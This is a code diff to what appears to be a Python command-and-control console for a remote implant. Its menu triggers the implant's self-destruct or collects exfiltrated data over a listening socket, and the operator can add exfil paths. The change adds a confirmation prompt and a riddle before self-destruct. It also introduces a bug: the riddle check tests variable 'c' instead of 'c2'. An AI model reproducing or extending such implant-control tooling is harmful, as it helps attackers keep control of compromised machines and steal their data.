@@ -62,19 +62,29 @@ while(True):
     print("2. Exfil data")
     print("3. Exit")
     print(f"{Fore.CYAN}What would you like to do:")
-    choice = input(">>")
+    choice = input(">>").lower()
     if choice == '1':
-        print(f"{Fore.RED}Self-destruct initiated")
-        send_implant('1')
-        print(f"{Fore.RED}Self-destruct complete")
-        exit()
+        print("Are you sure you want to self-destruct? This action cannot be undone. Enter 'y/n'")
+        c1 = input(">>").lower()
+        if(c1 == 'y'):
+            print("Answer this puzzle to self-destruct: I am an odd number, but take away one letter and I am 'even'")
+            c2 = input(">>").lower()
+            if(c2 == '7' or c == 'seven'):
+                print(f"{Fore.RED}Self-destruct initiated")
+                send_implant('1')
+                print(f"{Fore.RED}Self-destruct complete")
+                exit()
+            else:
+                print("Incorrect. Aborting self-destruct")
+        else:
+            print("Aborting self-destruct")
 
     elif choice == '2':       
         #Listen for the Responses
         c2_socket.listen(1)
         while(True):
             print("Press 'n' to end, 'a' to add an exfil path, any other key to continue")
-            c = input(">>")
+            c = input(">>").lower()
             if(c == 'n'):
                 break
             elif(c == 'a'):
@@ -90,7 +100,7 @@ while(True):
                 recieve_exfil()
             
             
-    elif choice == '3' or choice == 'q' or choice == 'exit' or choice == 'Exit' or choice == 'quit':
+    elif choice == '3' or choice == 'q' or choice == 'exit' or choice == 'quit':
         print("Exiting the C2 instance")
         print("Implant is still running - Connect to it again later")
         exit()
